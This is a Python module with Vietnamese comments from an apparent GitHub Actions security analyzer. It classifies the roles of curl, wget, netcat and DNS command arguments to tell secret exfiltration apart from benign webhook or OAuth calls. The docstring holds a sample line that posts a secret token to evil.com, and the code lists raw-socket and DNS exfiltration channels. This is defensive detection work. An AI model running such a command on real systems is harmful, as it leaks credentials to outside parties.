"""
engine/arg_roles.py

Phan loai vai tro cua tung argument trong mot lenh CLI.

Ly do ton tai: cac analyzer hien tai chi hoi "secret co xuat hien tren dong
co sink khong". Cau hoi do khong phan biet duoc

    curl -d '{"text":"ok"}' $SECRET_WEBHOOK      <- secret LA dich den, benign
    curl -d "$SECRET_TOKEN" https://evil.com     <- secret LA payload, exfil

Module nay tu chua hoan toan: khong import catalogs / engine.common, nen co
the tha vao repo ma khong lo vong import.
"""

import re
import shlex

# ==============================================================================
# ALLOWLIST
# ==============================================================================

ALLOWLISTED_DOMAINS = (
    "api.github.com",
    "uploads.github.com",
    "github.com",
    "raw.githubusercontent.com",
    "objects.githubusercontent.com",
    "pypi.org",
    "files.pythonhosted.org",
    "registry.npmjs.org",
    "ghcr.io",
    "localhost",
    "127.0.0.1",
    "vault.internal",
    "company.com",
)

# ==============================================================================
# PATTERNS
# ==============================================================================

GHA_EXPR_PATTERN = re.compile(r"\$\{\{.*?\}\}", re.DOTALL)

SECRET_EXPR_PATTERN = re.compile(
    r"\$\{\{\s*(secrets\.[A-Za-z0-9_-]+|github\.token)\s*\}\}"
)

# Input do nguoi ngoai kiem soat duoc.
UNTRUSTED_EXPR_PATTERN = re.compile(
    r"\$\{\{\s*github\.(?:event\.[A-Za-z0-9_.\[\]]*|head_ref)\s*\}\}"
)

VAR_REF_PATTERN = re.compile(
    r"\$(?:\{([A-Za-z_][A-Za-z0-9_]*|\d+)\}|([A-Za-z_][A-Za-z0-9_]*|\d+))"
)

# ---------------------------------------------------------------------------
# GitHub context expression trong run:
#
# VAR_REF_PATTERN chi khop $VAR va ${VAR}. No KHONG khop ${{ env.X }} vi sau
# dau $ la dau ngoac nhon thu hai. Hau qua: mot buoc lan truyen hoan toan hop
# le bi bo sot khi taint di qua context expression thay vi qua bien shell.
# ---------------------------------------------------------------------------
CONTEXT_ENV_PATTERN = re.compile(
    r"\$\{\{\s*env\.([A-Za-z_][A-Za-z0-9_]*)\s*\}\}"
)
CONTEXT_STEP_OUTPUT_PATTERN = re.compile(
    r"\$\{\{\s*steps\.([A-Za-z0-9_-]+)\.outputs\.([A-Za-z0-9_]+)\s*\}\}"
)

# SRC-06: workflow input. Nguon nay yeu hon secret (S_inp) nhung van la nguon.
INPUT_SOURCE_PATTERN = re.compile(
    r"\$\{\{\s*(inputs\.[A-Za-z0-9_]+|github\.event\.inputs\.[A-Za-z0-9_]+)\s*\}\}"
)


def step_output_key(step_id, output_name):
    """Khoa chuan cho mot step output trong bang taint."""
    return "steps.{}.outputs.{}".format(step_id, output_name)

URL_HOST_PATTERN = re.compile(r"https?://([^/\s\"']+)")

# Trao doi OAuth: secret trong payload la dung chuc nang, khong phai exfil.
OAUTH_EXCHANGE_PATTERN = re.compile(
    r"\b(?:grant_type|client_credentials|refresh_token|assertion)\b"
    r"|/oauth2?/|/oidc/|/v1/token\b"
)

# ==============================================================================
# CO MANG PAYLOAD, THEO TUNG LENH
# ==============================================================================

CURL_PAYLOAD_FLAGS = {
    "-d", "--data", "--data-raw", "--data-binary", "--data-ascii",
    "--data-urlencode", "-F", "--form", "--form-string",
    "-H", "--header", "-u", "--user", "-T", "--upload-file",
    "-b", "--cookie", "-A", "--user-agent", "-e", "--referer",
}
CURL_LOCAL_SINK_FLAGS = {"-o", "--output", "-D", "--dump-header"}
CURL_DEST_FLAGS = {"--url"}

WGET_PAYLOAD_FLAGS = {
    "--post-data", "--post-file", "--body-data", "--body-file", "--header",
}
WGET_LOCAL_SINK_FLAGS = {"-O", "--output-document"}

RAW_SOCKET_CMDS = {"nc", "ncat", "socat", "telnet"}
DNS_CMDS = {"dig", "nslookup", "host"}


# ==============================================================================
# TOKENIZE
# ==============================================================================

def _mask_expressions(text):
    """${{ ... }} co khoang trang se bi shlex xe doi. Che lai truoc khi split."""
    mapping = {}

    def _repl(match):
        key = "__GHAEXPR{}__".format(len(mapping))
        mapping[key] = match.group(0)
        return key

    return GHA_EXPR_PATTERN.sub(_repl, text), mapping


def _unmask(token, mapping):
    for key in sorted(mapping, key=len, reverse=True):
        token = token.replace(key, mapping[key])
    return token


def tokenize(line):
    masked, mapping = _mask_expressions(line)
    try:
        tokens = shlex.split(masked, posix=True)
    except ValueError:
        tokens = masked.split()
    return [_unmask(token, mapping) for token in tokens]


# ==============================================================================
# PHAN LOAI VAI TRO
# ==============================================================================

def classify_command_args(line, command):
    """
    Tra ve dict:
        {"destination": [...], "payload": [...], "local_sink": [...]}

    'destination' la noi du lieu di toi.
    'payload'     la du lieu duoc gui di.  <- chi cho nay moi la exfil.
    'local_sink'  la file ghi xuong dia.
    """
    roles = {"destination": [], "payload": [], "local_sink": []}
    tokens = tokenize(line)

    try:
        start = tokens.index(command) + 1
    except ValueError:
        # Lenh nam trong command substitution, vd VAR=$(curl ...)
        start = 0
        for idx, token in enumerate(tokens):
            if token.endswith(command):
                start = idx + 1
                break

    args = tokens[start:]

    if command == "curl":
        payload_flags = CURL_PAYLOAD_FLAGS
        sink_flags = CURL_LOCAL_SINK_FLAGS
        dest_flags = CURL_DEST_FLAGS
    elif command == "wget":
        payload_flags = WGET_PAYLOAD_FLAGS
        sink_flags = WGET_LOCAL_SINK_FLAGS
        dest_flags = set()
    else:
        # nc / socat / dig / host: khong co co mang payload, moi thu khong
        # phai co deu la dich den.
        for arg in args:
            if not arg.startswith("-"):
                roles["destination"].append(arg)
        return roles

    i = 0
    while i < len(args):
        arg = args[i]

        # Dang --flag=value
        if arg.startswith("--") and "=" in arg:
            flag, _, value = arg.partition("=")
            if flag in payload_flags:
                roles["payload"].append(value)
            elif flag in sink_flags:
                roles["local_sink"].append(value)
            elif flag in dest_flags:
                roles["destination"].append(value)
            i += 1
            continue

        if arg in payload_flags:
            if i + 1 < len(args):
                roles["payload"].append(args[i + 1])
            i += 2
            continue

        if arg in sink_flags:
            if i + 1 < len(args):
                roles["local_sink"].append(args[i + 1])
            i += 2
            continue

        if arg in dest_flags:
            if i + 1 < len(args):
                roles["destination"].append(args[i + 1])
            i += 2
            continue

        if arg.startswith("-"):
            # Co la, khong nuot arg ke tiep de tranh mat destination.
            i += 1
            continue

        roles["destination"].append(arg)
        i += 1

    return roles


# ==============================================================================
# TAINT LOOKUP THEO VAI TRO
# ==============================================================================

def find_secret(text):
    """Chuan hoa: ${{secrets.X}} va ${{ secrets.X }} ra cung mot dang."""
    if not isinstance(text, str):
        return None
    match = SECRET_EXPR_PATTERN.search(text)
    if not match:
        return None
    return "${{ " + match.group(1) + " }}"


def find_source(text):
    """Nguon truc tiep: secret (S_ctx) hoac workflow input (S_inp)."""
    secret = find_secret(text)
    if secret:
        return secret
    if not isinstance(text, str):
        return None
    match = INPUT_SOURCE_PATTERN.search(text)
    if match:
        return "${{ " + match.group(1) + " }}"
    return None


def iter_references(text):
    """Sinh ra moi ten co the tra cuu trong bang taint, THEO THU TU XUAT HIEN.

    Gom ba dang:
      $VAR / ${VAR}                       -> "VAR"
      ${{ env.VAR }}                      -> "VAR"
      ${{ steps.id.outputs.key }}         -> "steps.id.outputs.key"
    """
    hits = []
    for match in VAR_REF_PATTERN.finditer(text):
        name = match.group(1) or match.group(2)
        if name:
            hits.append((match.start(), name))
    for match in CONTEXT_ENV_PATTERN.finditer(text):
        hits.append((match.start(), match.group(1)))
    for match in CONTEXT_STEP_OUTPUT_PATTERN.finditer(text):
        hits.append((match.start(), step_output_key(match.group(1), match.group(2))))

    seen = set()
    for _, name in sorted(hits, key=lambda item: item[0]):
        if name not in seen:
            seen.add(name)
            yield name


def find_tainted_ref(text, tainted):
    """Ref tainted dau tien THEO THU TU XUAT HIEN (tat dinh)."""
    if not isinstance(text, str):
        return None
    for name in iter_references(text):
        if name in tainted:
            return name
    return None


def resolve_role(values, tainted):
    """
    Tra ve (source, path) neu vai tro nay chua du lieu tainted, nguoc lai
    (None, None).
    """
    blob = " ".join(v for v in values if isinstance(v, str))

    secret = find_source(blob)
    if secret:
        return secret, [secret]

    ref = find_tainted_ref(blob, tainted)
    if ref:
        info = tainted[ref]
        return info["Source"], list(info["Path"])

    return None, None


# ==============================================================================
# DESTINATION
# ==============================================================================

def classify_destination_roles(dest_values, tainted, legacy=True):
    """
    Phan loai dich den tu DANH SACH GIA TRI o vi tri destination, khong phai
    tu ca dong.

    Ban cu: `if not urls: return "untrusted_external"` -> moi URL nam trong
    bien deu an diem cao nhat. Do la nguyen nhan moi FP deu ra dung 10.0.

    legacy=True tra ve hai gia tri ma engine.common.calculate_risk hien biet.
    legacy=False tra ve 4 trang thai day du (can cap nhat calculate_risk).
    """
    detailed = _classify_detailed(dest_values, tainted)
    if not legacy:
        return detailed
    # Theo dac ta 3.6: untrusted_external = "resolved dynamically from tainted
    # inputs, unknown external hosts, or unverified IP addresses".
    # unresolved_secret KHOP dinh nghia do -> 1.2, khong phai 0.4.
    #
    # Truoc day map ve "allowlisted" de dap FP webhook. Do la thua: FP webhook
    # da bi chan boi FINDING_TYPE_SCORE_CAP (INFO cap 1.5) trong models.py.
    # Ha them o day chi lam chim oan moi lenh khong co URL literal, dien hinh
    # la DNS (nslookup/dig khong bao gio co scheme http://).
    return {
        "allowlisted": "allowlisted",
        "unresolved_secret": "untrusted_external",
        "external_literal": "external",
        "attacker_controlled": "untrusted_external",
    }[detailed]


def _classify_detailed(dest_values, tainted):
    if not dest_values:
        return "unresolved_secret"

    for value in dest_values:
        if isinstance(value, str) and UNTRUSTED_EXPR_PATTERN.search(value):
            return "attacker_controlled"

    for value in dest_values:
        if not isinstance(value, str):
            continue
        hosts = URL_HOST_PATTERN.findall(value)
        if hosts:
            hostname = hosts[0].lower().split("@")[-1].split(":")[0]
            for domain in ALLOWLISTED_DOMAINS:
                if hostname == domain or hostname.endswith("." + domain):
                    return "allowlisted"
            return "external_literal"

    # Khong co literal URL: dich den nam trong bien hoac secret.
    return "unresolved_secret"


# ==============================================================================
# QUYET DINH CHINH
# ==============================================================================

def evaluate_cli_flow(line, command, tainted):
    """
    Tra ve dict mo ta luong, hoac None neu khong co gi dang bao.

        {
          "verdict": "EXFIL" | "BENIGN_DESTINATION" | "CREDENTIAL_EXCHANGE",
          "source": str,
          "path": [...],
          "destination_type": str,     # legacy, dua thang vao calculate_risk
          "destination_detail": str,   # 4 trang thai
          "note": str,
        }

    Chi 'EXFIL' moi nen tao DetectionResult trong che do cham benchmark.
    """
    roles = classify_command_args(line, command)

    dest_type = classify_destination_roles(roles["destination"], tainted)
    dest_detail = classify_destination_roles(
        roles["destination"], tainted, legacy=False
    )

    # ---- DNS: chinh ten truy van la kenh mang du lieu ----
    if command in DNS_CMDS:
        source, path = resolve_role(roles["destination"], tainted)
        if source:
            return {
                "verdict": "EXFIL",
                "source": source,
                "path": path + [command],
                "destination_type": dest_type,
                "destination_detail": dest_detail,
                "note": "Du lieu tainted nam trong ten truy van DNS.",
            }
        return None

    # ---- Raw socket: egress khi co pipe vao hoac redirect stdin ----
    if command in RAW_SOCKET_CMDS:
        left = line.split(command)[0]
        piped = "|" in left or re.search(r"<\s*\S", line) is not None
        if not piped:
            return None
        source, path = resolve_role([left], tainted)
        if source:
            return {
                "verdict": "EXFIL",
                "source": source,
                "path": path + [command],
                "destination_type": dest_type,
                "destination_detail": dest_detail,
                "note": "Du lieu tainted duoc day vao raw socket.",
            }
        return None

    # ---- curl / wget ----
    payload_source, payload_path = resolve_role(roles["payload"], tainted)

    if payload_source:
        payload_blob = " ".join(roles["payload"])
        if OAUTH_EXCHANGE_PATTERN.search(payload_blob) and dest_detail in (
            "allowlisted",
            "unresolved_secret",
        ):
            return {
                "verdict": "CREDENTIAL_EXCHANGE",
                "source": payload_source,
                "path": payload_path + [command],
                "destination_type": dest_type,
                "destination_detail": dest_detail,
                "note": (
                    "Trao doi OAuth hop le. Khong phai exfil, nhung secret nam "
                    "trong argv; nen dung --data-urlencode qua stdin va "
                    "::add-mask:: cho token tra ve."
                ),
            }
        return {
            "verdict": "EXFIL",
            "source": payload_source,
            "path": payload_path + [command],
            "destination_type": dest_type,
            "destination_detail": dest_detail,
            "note": "Secret nam o vi tri payload cua {}.".format(command),
        }

    # Secret CHI o destination, payload sach -> cau hinh endpoint, khong exfil.
    dest_source, dest_path = resolve_role(roles["destination"], tainted)
    if dest_source:
        return {
            "verdict": "BENIGN_DESTINATION",
            "source": dest_source,
            "path": dest_path + ["{}:destination".format(command)],
            "destination_type": dest_type,
            "destination_detail": dest_detail,
            "note": (
                "Secret dung lam dia chi dich, payload khong tainted. "
                "Khong phai exfil."
            ),
        }

    return None


# ==============================================================================
# SPLIT STATEMENT (tuyen tinh - thay regex backtracking mu)
# ==============================================================================

def split_statements(line):
    """
    Tach statement theo ';' o ngoai quote va ngoai ngoac.

    Ban cu dung:
        re.split(r";(?=(?:[^'\"]|'[^']*'|\"[^\"]*\")*$)", line)
    Lookahead do co alternation long quantifier voi cac nhanh chong lan ->
    backtracking mu. Dong dai khong khop se treo. Ham nay chay O(n).
    """
    out, buf = [], []
    quote = None
    depth = 0
    i = 0
    while i < len(line):
        char = line[i]
        if quote:
            if char == "\\" and i + 1 < len(line):
                buf.append(char)
                buf.append(line[i + 1])
                i += 2
                continue
            if char == quote:
                quote = None
            buf.append(char)
        elif char in "\"'":
            quote = char
            buf.append(char)
        elif char in "([{":
            depth += 1
            buf.append(char)
        elif char in ")]}":
            depth = max(0, depth - 1)
            buf.append(char)
        elif char == ";" and depth == 0:
            out.append("".join(buf))
            buf = []
        else:
            buf.append(char)
        i += 1
    if buf:
        out.append("".join(buf))
    return [s.strip() for s in out if s.strip()]


# ==============================================================================
# VAI TRO ARGUMENT TRONG LOI GOI HAM (python / nodejs)
# ==============================================================================

PY_PAYLOAD_KWARGS = (
    "data", "json", "headers", "params", "auth", "content", "body", "files",
)
JS_PAYLOAD_KEYS = (
    "data", "body", "headers", "json", "params", "auth", "form",
)


def split_call_args(text):
    """
    Tach phan trong ngoac cua loi goi ham thanh (positional, keyword).

        requests.post(url, data=key)  ->  (["url"], ["data=key"])

    Tra ve ([], []) neu khong parse duoc.
    """
    start = text.find("(")
    if start == -1:
        return [], []

    depth = 0
    quote = None
    parts, buf = [], []
    for i in range(start, len(text)):
        char = text[i]
        if quote:
            buf.append(char)
            if char == quote:
                quote = None
            continue
        if char in "\"'":
            quote = char
            buf.append(char)
            continue
        if char in "([{":
            depth += 1
            if depth == 1:
                continue
        elif char in ")]}":
            depth -= 1
            if depth == 0:
                parts.append("".join(buf))
                break
        if depth >= 1:
            if char == "," and depth == 1:
                parts.append("".join(buf))
                buf = []
                continue
            buf.append(char)

    positional, keyword = [], []
    for part in parts:
        part = part.strip()
        if not part:
            continue
        if re.match(r"^[A-Za-z_][A-Za-z0-9_]*\s*=(?!=)", part):
            keyword.append(part)
        else:
            positional.append(part)
    return positional, keyword


def call_payload_blob(text, payload_keys=PY_PAYLOAD_KWARGS):
    """
    Tra ve chuoi chi gom cac argument MANG DU LIEU.

    Ban cu quet identifier tren CA statement, nen bien tainted nam o vi tri URL
    cung bi tinh la exfil. Ham nay loai bo vi tri do.
    """
    positional, keyword = split_call_args(text)
    blob = []
    for part in keyword:
        name, _, value = part.partition("=")
        if name.strip() in payload_keys:
            blob.append(value)
    # Positional dau tien cua requests/axios la URL -> bo qua.
    # Positional thu hai tro di co the la body (vd requests.post(url, body)).
    blob.extend(positional[1:])
    return " ".join(blob)